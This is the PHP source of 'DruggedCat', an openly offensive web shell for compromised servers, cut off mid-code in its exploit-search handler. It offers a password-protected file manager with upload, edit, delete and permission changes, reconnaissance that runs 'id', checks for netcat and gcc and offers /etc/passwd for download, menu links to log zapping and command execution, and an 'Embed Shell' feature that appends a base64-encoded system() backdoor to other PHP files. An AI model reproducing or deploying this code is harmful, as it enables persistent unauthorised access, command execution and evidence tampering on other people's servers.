<?php
/*
DruggedCat [WebShell]
Copyright (C) 2012 wlan0 (Rainbow)

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

//Default Login: 
Username-> Rainbow
Password-> DruggedCatAuth 

¡Change this! 
*/
$loginuser = "Rainbow";
$loginpw   = "DruggedCatAuth";

$fetchdir = getcwd();
$msgbox   = base64_decode("PHRkIHN0eWxlPSd2ZXJ0aWNhbC1hbGlnbjogdG9wOyc+PHR0PiZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOw0KJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7IDxicj4NCiZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOw0KfFwmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsgL3w8YnI+DQombmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsNCnwgXF9fX18vIHw8YnI+DQombmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsNCnwmbmJzcDsgL1wvXCZuYnNwOyB8PGJyPg0KJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7DQouJ19fXyZuYnNwOyBfX19gLjxicj4NCiZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOw0KLyZuYnNwOyBcPGZvbnQgY29sb3I9J3JlZCc+QDwvZm9udD4vJm5ic3A7IFw8Zm9udCBjb2xvcj0ncmVkJz5APC9mb250Pi8mbmJzcDsgXDxicj4NCiZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOw0KXy4tLS0tLS0tLS0tLS0tLSggX19fXyBfXyBfX19fXyk8YnI+DQombmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsgLi0nIFwmbmJzcDsgLS4gfCB8IHwgfA0KfCBcIC0tLS1cLy0tLS0gLzxicj4NCiZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyAuJ1wmbmJzcDsgfCB8IC8gXGAgfCB8IHwgfCZuYnNwOw0KYC4mbmJzcDsgLSdgLSZuYnNwOyAuJzxicj4NCiZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyAvYCZuYnNwOyBgIGAgJy8gLyBcIHwgfCB8IHwgXCZuYnNwOw0KYC0tLS0tLSdcPGJyPg0KJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7IC8tJm5ic3A7IGAtLS0tLS0tLicNCmAtLS0tLS4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsgLS0tLS0uIGAtLS0uPGJyPg0KJm5ic3A7Jm5ic3A7Jm5ic3A7ICgmbmJzcDsgLyB8IHwgfCB8Jm5ic3A7ICkvIHwgfCB8ICkvIHwgfCB8IHwgfCApIHwgfCApPGJyPg0KJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7DQpgLl9fX19fX19fXy4nX19fX18sLCwvXF9fX19fX18sLCwsL18sLCwsLyZuYnNwOyBWSzxicj4NCkNvZGVkIGJ5IHdsYW4wIChSYWluYm93KSAtIFVuZGVyIEdQTHYzIExpY2Vuc2U8YnIvPg0KVmlzaXQ6IDxhIGhyZWY9J2h0dHA6Ly93d3cud2xhbjAuY29tLmFyJyByZWw9J25vZm9sbG93Jz53ZWJzaXRlPC9hPg0KPC90dD4NCjwvdGQ+");
function page($title, $height)
{
    $fetchdir = getcwd();
    echo <<< HTML
<html>
<title>DruggedCat -> $title</title>
<head>
<style type='text/css'>
#box a{
color: green;
text-decoration: none;
}
#box tt{
color: white;
}
#box ul li{
background-color: #292828;
border-radius: 2px;
display: inline;
border:1px dashed;
font-size:13px;
padding: 7px;
font-family: 'fixed';
}
#box ul{
border:1px green dashed;
background-color: #292828;
display: block;
}
#box{
border:1px green dashed;
background-color: #151515;
width: 1000px;
height: $height;
}
#box p{
color: white;
text-align: left;
}
.error{
margin-top:10px;
background:none repeat scroll 0 0 #A51D1D;
border: 1px black dashed;
height:20px;
line-height:20px;
font-size:14px;
padding:5px;
text-align:center;
color:#FFF;
width:540px;
text-transform:uppercase;
-webkit-border-radius:5px;
-moz-border-radius:5px;
border-radius:5px
}
.bar{
margin-top:10px;
background:none repeat scroll 0 0 black;
height:20px;
line-height:20px;
font-size:10px;
text-align:center;
color:black;
}
.input{
background-color: #000000;
border: 1px dashed green;
border-radius: 4px;
color: white;
width: 200px;
}
#up{
background-color: #000000;
border: 1px dashed green;
border-radius: 4px;
color: white;
width: 200px;
}
.submit{
background-color: #000000;
color: green;
border: 1px green dashed;
border-radius: 4px;
}
#box textarea{
background-color: #000000;
color: green;
resize: none;
border: 1px solid green;
}
#box label{
color: white;
}
.tb{
background-color: #000000;
border: 1px #103C13 solid;
}
#items{
text-align: left;
width: 1000px;
}
#terminal{
height: auto;
width: 720px;
text-align: left;
color: white;
background-color: #000000;
border-radius: 3px;
}
#output{
font-size: 10px;
}
#terminal label{
text-align: right;
}
#terminal input{
height: 12px;
font-size: 10px;
color: white;
outline: none;
}
#terminal input:focus{
border: none;
outline: none;
color: black;
}
#terminal p{
font-size: 10px;
}
</style>
</head>
<body bgcolor='black'>
<script>
function suicide()
{
if(confirm("Sure?"))
{
location.href="?suicide";
}
else
{
location.href="?"
}
}
</script>
<center>
<div id='box'>
<ul>
<li><a href=?dir=$fetchdir>./FileManager</a></li>
<li><a href='?info'>./Info</a></li>
<li><a href='?sql'>./SQL</a></li>
<li><a href='?zapper'>./LogZapper</a></li>
<li><a href='?hash'>./Decrypt/Encrypt</a></li>
<li><a href='?reversedns'>./ReverseDNS</a></li>
<li><a href='?execute'>./ExecuteCommand</a></li>
<li><a href='' onClick="javascript:suicide()">suicide();</a></li>	
</ul>
HTML;
}
/* decodeSize function by rostvertol */
function decodeSize($bytes)
{
    $types = array(
        'B',
        'KB',
        'MB',
        'GB',
        'TB'
    );
    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
    return (round($bytes, 2) . $types[$i]);
}

function checksession()
{
    session_start();
    if (!$_SESSION['adentro']) {
        header("Location: ?login");
    }
}
if (isset($_GET['login'])) {
    echo <<< HTML
<html>
<title>DruggedCat -> Login</title>
<head>
<style>
#box{
border:1px green dashed;
background-color: #151515;
width: 200px;
height: auto;
margin-left: auto;
margin-right: auto;
}
#box input{
background-color: #000000;
border: 1px dashed green;
border-radius: 4px;
color: white;
width: 200px;
}
#box submit{
background-color: #000000;
color: green;
border: 1px green dashed;
border-radius: 4px;
}
</style>
</head>
<body bgcolor="black">
<div id='box'>
<form action="" method="post">
<center><label><font color="white">Username:</font></label><input type="text" name="login_user"/><br/>
<label><font color="white">Password:</font></label><input type="password" name="login_passwd"/><br/>
<input type="submit" name="login_submit" class="submit" value="Login"/></center>
</form>
</div>
</body>
</html>
HTML;
    
    if (isset($_POST['login_submit'])) {
        $login_user   = $_POST['login_user'];
        $login_passwd = $_POST['login_passwd'];
        
        if ($login_user == $loginuser && $login_passwd == $loginpw) {
            session_start();
            $_SESSION['adentro'] = TRUE;
            $saved               = $_SESSION['adentro'];
            echo '<script>window.location = "?";</script>';
        } else {
            echo "<center><div id='bad' style='margin-top:10px; background:none repeat scroll 0 0 #A51D1D;
border: 1px black dashed; height:20px; line-height:20px; font-size:14px; padding:5px; text-align:center; color:#FFF; width:540px; text-transform:uppercase; -webkit-border-radius:5px; -moz-border-radius:5px; border-radius:5px'> User or password is incorrect.</div></center>";
        }
    }
    
    
}
function fetchtype()
{
    echo "<table id ='connection' width='400px'><tr><td><label><font color='white'>Type:</font></label><br /><select name='connection' id='connection'>";
    if (@function_exists(mysql_connect)) {
        echo "<option value='MySQL'>MySQL</option>";
        $port = "3306";
    } elseif (@function_exists(pg_connect)) {
        echo "<option value='PostgreSQL'>PostgreSQL</option>";
        $port = "5432";
    } else {
        echo "<option value='notsupported'>Not Supported</option>";
        $port = "N/A";
    }
    echo "</select><br/><td></tr></table>";
    echo "<table id ='hostname' width='400px'><tr><td><label><font color='white'>Hostname</font></label><br /><input type='text' name='hostname' class='input' value='localhost'/><br/><td></tr></table>";
    echo "<table id ='port' width='400px'><tr><td><label><font color='white'>Port</font></label><br /><input type='text' name='port' class='input' value=$port></input><br/><td></tr></table>";
}
$errormsg[0]  = "<div id='error' class='error'>Fail at upload</div>";
$errormsg[1]  = "<div id='error' class='error'>You don't have permissions to navigate in this dir or the directory is unfetchable.</div><br/>";
$errormsg[2]  = "<div id='error' class='error'>ERROR: Not writable.</div><br/>";
$errormsg[3]  = "<div id='error' class='error'>File doesn't exist or -r privileges.</div><br/>";
$errormsg[4]  = "<div id='error' class='error'>File doesn't exist.</div><br/>";
$errormsg[5]  = "<div id='error' class='error'>File or directory can't be deleted.</div><br/>";
$errormsg[6]  = "<div id='error' class='error'>Can't connect!</div><br/>";
$errormsg[7]  = "<div id='error' class='error'>One or more fields are empty.</div><br/>";
$errormsg[8]  = "<div id='error' class='error'>Fail to copy.</div><br/>";
$errormsg[9]  = "<div id='error' class='error'>Fail to move.</div><br/>";
$errormsg[10] = "<div id='error' class='error'>Fail at download</div><br/>";
$errormsg[11] = "<div id='error' class='error'>You can't suicide.</div><br/>";
$errormsg[12] = "<div id='error' class='error'>Can't edit the column.</div><br/>";
$errormsg[13] = "<div id='error' class='error'>Can't count the columns.</div><br/>";
$errormsg[14] = "<div id='error' class='error'>The file must be PHP.</div><br/>";
$errormsg[15] = "<div id='error' class='error'>Directory already exists.</div><br/>";
$errormsg[16] = "<div id='error' class='error'>Fail to create dir.</div><br/>";
$errormsg[17] = "<div id='error' class='error'>File already exists.</div><br/>";
$errormsg[18] = "<div id='error' class='error'>Fail to create file.</div><br/>";
$errormsg[19] = "<div id='error' class='error'>Fail to set new perms.</div><br/>";
$errormsg[20] = "<div id='error' class='error'>Target doesn't exist.</div><br/>";
$errormsg[21] = "<div id='error' class='error'>Unable to fetch data.¿safe_mode <b>on</b>?.</div><br/>";

if (!$_GET) {
    checksession();
    page("Index", "300");
    echo $msgbox . "</div></center></body></html>";
}
if (isset($_GET['dir'])) {
    checksession();
    if ($_GET['dir'] == "") {
        header("Location: ?dir=$fetchdir");
    }
    page("File Manager", "auto");
    $dir = $_GET['dir'];
    $dir = @realpath($dir);
    echo <<< HTML
<script type="text/javascript">
function showonlyonev2(thechosenone) {
      var newboxes = document.getElementsByTagName("div");
      for(var x=0; x<newboxes.length; x++) {
            name = newboxes[x].getAttribute("class");
            if (name == 'newboxes-2') {
                  if (newboxes[x].id == thechosenone) {
                        if (newboxes[x].style.display == 'block') {
                              newboxes[x].style.display = 'none';
                        }
                        else {
                              newboxes[x].style.display = 'block';
                        }
                  }else {
                        newboxes[x].style.display = 'none';
                  }
            }
      }
}
</script>
HTML;
    echo "<form name='update' id='update' method='get' action=?dir=$dir><label><font color='white'>Directory: </font></label><input type='text' name='dir' id='dir' class='input' value=$dir><input type='submit' class='submit' value='go'/></form>";
    if (isset($_POST['copy'])) {
        $to   = $_POST['atet'];
        $from = $_POST['copyf'];
        if (!@copy($from, $to)) {
            echo $errormsg[8];
        }
    }
    if (isset($_POST['move'])) {
        $to   = $_POST['atet2'];
        $from = $_POST['movef'];
        if (!@rename($from, $to)) {
            echo $errormsg[9];
        }
    }
    if (isset($_POST['mkdir'])) {
        $mkdir = $_POST['dirf'];
        if (file_exists($mkdir)) {
            echo $errormsg[15];
        }
        if (!@mkdir($mkdir)) {
            echo $errormsg[16];
        }
    }
    if (isset($_POST['mkfile'])) {
        $mkfile = $_POST['filef'];
        if (file_exists($mkfile)) {
            echo $errormsg[17];
        }
        $create = @fopen($mkfile, 'w');
        $write  = @fwrite($create, '');
        if (!isset($write)) {
            echo $errormsg[18];
        }
        @fclose($create);
        echo "<script>window.location='?edit=$mkfile';</script>";
    }
    if (isset($_POST['chmod'])) {
        $target = $_POST['target'];
        $set    = $_POST['set'];
        if (!file_exists($target)) {
            echo $errormsg[20];
        }
        if (!@chmod($target, $set)) {
            echo $errormsg[19];
        }
    }
    if (isset($_GET['go'])) {
        $dir = $_GET['dir'];
        $dir = @realpath($dir);
        chdir($dir);
    }
    
    echo "</form>";
    if (@$open = opendir($dir)) {
        echo '<div class="bar"><a href=javascript:javascript:showonlyonev2("newboxes1-2");><font color="white"><b>[Uploader] </b></font><font color="white"></a><a  href=javascript:showonlyonev2("newboxes2-2");><font color="white"><b>[Embed Shell] </b></font></a><a href=javascript:showonlyonev2("newboxes3-2");><font color="white"><b>[Copy] </b></font></a><a href=javascript:showonlyonev2("newboxes4-2");><font color="white"><b>[Move]</b></font></a><a href=javascript:showonlyonev2("newboxes5-2");><font color="white"><b>[Make dir]</b></font></a><a href=javascript:showonlyonev2("newboxes6-2");><font color="white"><b>[Make file]</b></font></a><a href=javascript:showonlyonev2("newboxes7-2");><font color="white"><b>[Change perms]</b></font></a></div>';
        echo "<div class='newboxes-2' id='newboxes1-2' style='display: none'>";
        echo '<form action="?dir=' . $dir . '" method="post" enctype="multipart/form-data" name="upForm">';
        echo '<input name="archivo" id="archivo" type="file" class="input"/><br/>';
        echo '<input type="submit" class="submit" name="up" value="Upload"/>';
        echo '</form></div>';
        echo "<div class='newboxes-2' id='newboxes2-2' style='display: none'>";
        echo '<form action="?dir=' . $dir . '" method="post" name="embed">';
        echo '<input name="file" id="file" type="text" class="input" value="' . $dir . '" size="200"/><br/>';
        echo '<input type="submit" class="submit" name="embed" value="Embed"/>';
        echo '</form></div>';
        echo "<div class='newboxes-2' id='newboxes3-2' style='display: none'><form name='copy' id='copy' method='post' action=''><label>Copy from</label><input type='text' class='input' name='copyf' value='file_1.php' size='200'/><label>To</label><input type='text' class='input' name='atet' value='file_2.php' size='200'/><input type='submit' name='copy' class='submit' value='Copy'/></form></div>";
        echo "<div class='newboxes-2' id='newboxes4-2' style='display: none'><form name='move' id='move' method='post' action=''><label>Move from</label><input type='text' class='input' name='movef' value='file_1.php' size='200'/><label>To</label><input type='text' class='input' name='atet2' value='file_2.php' size='200'/><input type='submit' name='move' class='submit' value='Move'/></form></div>";
        echo "<div class='newboxes-2' id='newboxes5-2' style='display: none'><form name='mkdir' id='mkdir' method='post' action=''><label>Make this dir:</label><input type='text' class='input' name='dirf' value='$fetchdir' size='200'/><input type='submit' name='mkdir' class='submit' value='Create'/></form></div>";
        echo "<div class='newboxes-2' id='newboxes6-2' style='display: none'><form name='mkfile' id='mkfile' method='post' action=''><label>Make this file:</label><input type='text' class='input' name='filef' value='$fetchdir/newfile.dat' size='200'/><input type='submit' name='mkfile' class='submit' value='Create'/></form></div>";
        echo "<div class='newboxes-2' id='newboxes7-2' style='display: none'><form name='changeperms' id='changeperms' method='post' action=''><label>Target:</label><input type='text' class='input' name='target' value='$fetchdir/file.php' size='200'/><label>Chmod:</label><input type='text' class='input' name='set' value='550' size='50'/><input type='submit' name='chmod' class='submit' value='Change'/></form></div>";
        if (isset($_POST['embed'])) {
            /* Obtengo informacion, extension y compruebo. Y no se porque hago un comentario cada 316 lineas. */
            $n1 = pathinfo($_POST['file']);
            $n2 = $n1['extension'];
            if ($n2 != "php") {
                echo $errormsg[14];
                echo "</div></center></body></html>";
                exit();
            }
            if (!is_writable($_POST['file'])) {
                echo $errormsg[2];
                echo "</div></center></body></html>";
                exit();
            }
            if (file_exists($_POST['file'])) {
                $target     = $_POST['file'];
                $shell      = "\n" . base64_decode('PD9waHANCmlmIChpc3NldCgkX0dFVFsnZGdjbWQnXSkpew0KJGMgPSAkX0dFVFsnZGdjbWQnXTsN
CmVjaG8gQHN5c3RlbSAoJGMpIC4gIjxici8+IjsgDQp9DQo/Pg==');
                $wakeupfile = @fopen($_POST['file'], "a");
                @fwrite($wakeupfile, $shell);
                @fclose($wakeupfile);
                echo "<br /><font color='green'>Successful!<br/>";
                echo "<b>Use:</b> file_target.php?dgcmd=Command</font>";
            }
        }
        if (isset($_POST['up'])) {
            $archivo     = basename($_FILES['archivo']['name']);
            $target_path = $dir . "/" . $archivo;
            if ($_FILES['archivo']['size'] > 0) {
                @move_uploaded_file($_FILES['archivo']['tmp_name'], $target_path);
            }
        }
        echo "<pre><table id ='items' class='tb'><tr><td width='80px'><font color='white'><b>Perms</b></font></td><td width='70px'><font color='white'><b>Size</b></font></td><td><font color='white'><b>Files and directories</b></font></td><td width='255px'><font color='white'><b>Options</b></font></tr></table>";
        while ($items = readdir($open)) {
            error_reporting(0);
            $dir = $_GET['dir'];
            if ($items != "." && $items != "..") {
                $check       = $dir . "/" . $items;
                $verify_file = pathinfo($check);
                
                /* Source of this function: http://php.net/manual/es/function.fileperms.php*/
                
                $permisos = fileperms($check);
                
                if (($permisos & 0xC000) == 0xC000) {
                    // Socket
                    $info = 's';
                } elseif (($permisos & 0xA000) == 0xA000) {
                    // Enlace Simbólico
                    $info = 'l';
                } elseif (($permisos & 0x8000) == 0x8000) {
                    // Regular
                    $info = '-';
                } elseif (($permisos & 0x6000) == 0x6000) {
                    // Especial Bloque
                    $info = 'b';
                } elseif (($permisos & 0x4000) == 0x4000) {
                    // Directorio
                    $info = 'd';
                } elseif (($permisos & 0x2000) == 0x2000) {
                    // Especial Carácter
                    $info = 'c';
                } elseif (($permisos & 0x1000) == 0x1000) {
                    // Tubería FIFO
                    $info = 'p';
                } else {
                    // Desconocido
                    $info = 'u';
                }
                
                // Propietario
                $info .= (($permisos & 0x0100) ? 'r' : '-');
                $info .= (($permisos & 0x0080) ? 'w' : '-');
                $info .= (($permisos & 0x0040) ? (($permisos & 0x0800) ? 's' : 'x') : (($permisos & 0x0800) ? 'S' : '-'));
                
                // Grupo
                $info .= (($permisos & 0x0020) ? 'r' : '-');
                $info .= (($permisos & 0x0010) ? 'w' : '-');
                $info .= (($permisos & 0x0008) ? (($permisos & 0x0400) ? 's' : 'x') : (($permisos & 0x0400) ? 'S' : '-'));
                
                // Mundo
                $info .= (($permisos & 0x0004) ? 'r' : '-');
                $info .= (($permisos & 0x0002) ? 'w' : '-');
                $info .= (($permisos & 0x0001) ? (($permisos & 0x0200) ? 't' : 'x') : (($permisos & 0x0200) ? 'T' : '-'));
                
                
                $dir       = $dir . "/";
                $dir       = @realpath($dir);
                $FilePerms = $check;
                $size      = filesize($check);
                if (!is_readable($dir)) {
                    echo $errormsg[1];
                }
                /*
                 *Esta parte la comento porque queda en desarrollo
                 *$dirsize += filesize($check); 
                 */
                if (is_dir($check)) {
                    $decodesize = "-";
                } else {
                    $decodesize = decodeSize($size);
                }
                if (is_dir($check)) {
                    echo "<table id ='items' class='tb'><tr><td width='80px'><font color='white'>$info</font></td><td width='70px'><font color='white'>$decodesize</font></td><td><font color='white'><a href=\"?dir=$dir/$items\"><b>/$items/</b></font></a></td><td width='255px'><a href='?del=$dir/$items'>Delete</a></tr></table>";
                } else {
                    $dir = $_GET['dir'];
                    $dir = @realpath($dir);
                    echo "<table id ='items' class='tb'><tr><td width='80px'><font color='white'>$info</font></td><td width='70px'><font color='white'>$decodesize</font></td><td><a href='?edit=$dir/$items'><font color='white' >$items</font></a></td><td width='255px'><a href='?edit=$dir/$items'>View/Edit</a><font color='green'> || </font><a href='?d=$dir/$items'>Download</a><font color='green'> || </font><a href='?del=$dir/$items'>Delete</a>";
                }
                echo "</td></tr></table>";
            }
        }
    }
    echo "</pre>";
    echo "</div></center></body></html>";
    @closedir($dir);
}
if (isset($_GET['edit'])) {
    checksession();
    page("Edit", "auto");
    echo '<form action="" method="post">';
    $sEdit = @realpath($_GET['edit']);
    if (isset($_POST['editor'])) {
        $fopen   = @fopen($sEdit, 'w');
        $content = stripslashes($_POST['content']);
        $save    = @fwrite($fopen, $content);
        if (!@is_writable($sEdit)) {
            echo $errormsg[2];
        }
    }
    if (!is_readable($sEdit)) {
        echo $errormsg[3];
        exit();
    }
    echo '<textarea name="content" cols="100" rows="20">';
    @$read = fopen($sEdit, 'r');
    @$read = fread($read, filesize($sEdit));
    echo htmlentities($read);
    echo <<< HTML
</textarea><br/>
<input type="submit" name="editor" class="submit" value="Save"/>
</form>
</div></center></body></html>
HTML;
}
if (isset($_GET['d'])) {
    checksession();
    error_reporting(0);
    if (file_exists($_GET['d'])) {
        $sD             = $_GET['d'];
        $fD             = filesize($_GET['d']);
        $file_extension = strtolower(substr(strrchr($sD, '.'), 1));
        switch ($file_extension) {
            case 'pdf':
                $ctype = 'application/pdf';
                break;
            case 'exe':
                $ctype = 'application/octet-stream';
                break;
            case 'sh':
                $ctype = 'application/octet-stream';
                break;
            case 'zip':
                $ctype = 'application/zip';
                break;
            case 'doc':
                $ctype = 'application/msword';
                break;
            case 'xls':
                $ctype = 'application/vnd.ms-excel';
                break;
            case 'ppt':
                $ctype = 'application/vnd.ms-powerpoint';
                break;
            case 'gif':
                $ctype = 'image/gif';
                break;
            case 'png':
                $ctype = 'image/png';
                break;
            case 'jpe':
            case 'jpeg':
            case 'jpg':
                $ctype = 'image/jpg';
                break;
            default:
                $ctype = 'application/force-download';
        }
        header('Content-Description: File Transfer');
        header('Content-Type: ' . $ctype);
        header("Content-Disposition: attachment; filename=" . $sD);
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . $fD);
        ob_clean();
        flush();
        readfile($sD);
    } else {
        page("Error", "auto");
        echo $errormsg[4];
        echo "</div></center></body></html>";
    }
}
if (isset($_GET['del'])) {
    checksession();
    $del     = $_GET['del'];
    $delPath = dirname($_GET['del']);
    $delPath = @realpath($delPath);
    if (is_dir($del)) {
        $del = rmdir($del);
    } else {
        $del = @unlink($_GET['del']);
    }
    if ($del) {
        header("Location: ?dir=$delPath");
    } else {
        error_reporting(0);
        page("Error", "auto");
        echo $errormsg[5];
        echo "</div></center></body></html>";
    }
}
if (isset($_GET['info'])) {
    checksession();
    if (@ini_get("safe_mode") == 1) {
        $safe_mode = "<font color='red'><b>On</b></font>";
    } else {
        $safe_mode = "<font color='green'><b>Off</b></font>";
    }
    if (@function_exists("curl_version")) {
        $curl = "<font color='green'><b>Installed</b></font>";
    } else {
        $curl = "<font color='red'><b>Not installed</b></font>";
    }
    @ob_start();
    if (@system("gcc --help")) {
        $gcc = "<font color='green'><b>Installed</b></font>";
    } else {
        $gcc = "<font color='red'><b>Not installed</b></font>";
    }
    if (@system("nc --help")) {
        $netcat = "<font color='green'><b>Installed</b></font>";
    } else {
        $netcat = "<font color='red'><b>Not installed</b></font>";
    }
    @ob_clean();
    $uname = php_uname('s');
    if ($uname == "Linux") {
        $disk_total_space = disk_total_space("/");
        $disk_free_space  = disk_free_space("/");
        $disk             = "/";
    } elseif ($uname == "FreeBSD") {
        $disk_total_space = disk_total_space("/");
        $disk_free_space  = disk_free_space("/");
        $disk             = "/";
    } else {
        $disk_total_space = disk_total_space("C:");
        $disk_free_space  = disk_free_space("C:");
        $disk             = "C:";
    }
    $extens = get_loaded_extensions();
    page("Server Information", "auto");
    echo "<font color='white'><h2>Server Information</h2></font>";
    echo "<center><table id ='os' width='800px' style='background-color: black; font-size: 11px; border:1px green dashed; border-radius: 4px;'><tr><td><label><font color='red'>OS: </font></label><font color='white'>" . PHP_OS . "</font><br/></table></center>";
    echo "<center><table id ='uname' width='800px' style='background-color: black; font-size: 11px; border:1px green dashed; border-radius: 4px;'><tr><td><label><font color='red'>uname -a: </font></label><font color='white'>" . php_uname() . "</font><br/></table></center>";
    echo "<center><table id ='ip' width='800px' style='background-color: black; font-size: 11px; border:1px green dashed; border-radius: 4px;'><tr><td><label><font color='red'>Server IP: </font></label><font color='white'>" . $_SERVER['SERVER_ADDR'] . "</font><br/></table></center>";
    echo "<center><table id ='safemode' width='800px' style='background-color: black; font-size: 11px; border:1px green dashed; border-radius: 4px;'><tr><td><label><font color='red'>Safe-mode: </font></label><font color='white'>" . $safe_mode . "</font><br/></table></center>";
    echo "<center><table id ='phpversion' width='800px' style='background-color: black; font-size: 11px; border:1px green dashed; border-radius: 4px;'><tr><td><label><font color='red'>PHP Version: </font></label><font color='white'>" . phpversion();
    echo <<< HTML
<script language="JavaScript">
function phpinfow (ahref) {
var op="scrollbars=yes, width=708, height=365, top=85, left=140";
window.open(ahref,"",op);
}
</script>
<a href="javascript:phpinfow('?phpinfo')">[phpinfo]</a></font><br/></table></center>
HTML;
    echo "<center><table id ='diskspace' width='800px' style='background-color: black; font-size: 11px; border:1px green dashed; border-radius: 4px;'><tr><td><label><font color='red'>Space of $disk : </font></label><font color='white'>" . decodeSize($disk_total_space) . "/" . decodeSize($disk_free_space) . "</font><br/></table></center>";
    echo "<center><table id ='curl' width='800px' style='background-color: black; font-size: 11px; border:1px green dashed; border-radius: 4px;'><tr><td><label><font color='red'>cURL: </font></label><font color='white'>" . $curl . "</font><br/></table></center>";
    echo "<center><table id ='gcc' width='800px' style='background-color: black; font-size: 11px; border:1px green dashed; border-radius: 4px;'><tr><td><label><font color='red'>GCC: </font></label><font color='white'>" . $gcc . "</font><br/></table></center>";
    echo "<center><table id ='nc' width='800px' style='background-color: black; font-size: 11px; border:1px green dashed; border-radius: 4px;'><tr><td><label><font color='red'>Netcat: </font></label><font color='white'>" . $netcat . "</font><br/></table></center>";
    echo "<center><table id ='username' width='800px' style='background-color: black; font-size: 11px; border:1px green dashed; border-radius: 4px;'><tr><td><label><font color='red'>Username: </font></label><font color='white'>" . get_current_user() . "</font><br/></table></center>";
    if (is_readable("/etc/passwd")) {
        echo "<center><table id ='etcpasswd' width='800px' style='background-color: black; font-size: 11px; border:1px green dashed; border-radius: 4px;'><tr><td><label><font color='red'>/etc/passwd : </font></label><font color='white'><a href='?d=/etc/passwd'>[download]</a></font></table></center>";
    }
    @ob_start();
    @passthru(@system("id"));
    $id = @ob_get_contents();
    @ob_end_clean();
    if (@ini_get("safe_mode") == 1) {
        $id = "Unreachable";
    }
    echo "<center><table id ='id' width='800px' style='background-color: black; font-size: 11px; border:1px green dashed; border-radius: 4px;'><tr><td><label><font color='red'>id : </font></label><font color='white'>" . $id . "</font></table></center>";
    $uTwo = php_uname('r');
    $uTwo = explode("-", $uTwo);
    
    if (php_uname('s') == "Linux") {
        for ($i = 0; $i < 1; $i++) {
            $uTwoT = $uTwo[$i];
        }
        
    } else {
        $uTwoT = $uTwo;
    }
    echo "<p><center><font color='white'>Exploit Searcher:</font></center></p>";
    echo "<form action='' method='post'>";
    echo "<input type='text' name='busqueda' class='input' value='Query'/><br />";
    echo "<select name='query' class='input' id='query'>";
    echo "<option value='ExploitDB'=>Exploit-DB</option>";
    echo "<option value='Metasploit'>Metasploit</option>";
    echo "<option value='CVS'>CVS</option></select><br/>";
    echo "<input type='submit' name='submit_exploit' class='submit' value='Search'/></form>";
    if (isset($_POST['submit_exploit'])) {
        if (trim($_POST['busqueda']) == "") {
            echo "<script>alert('¡Query empty!');</script>";
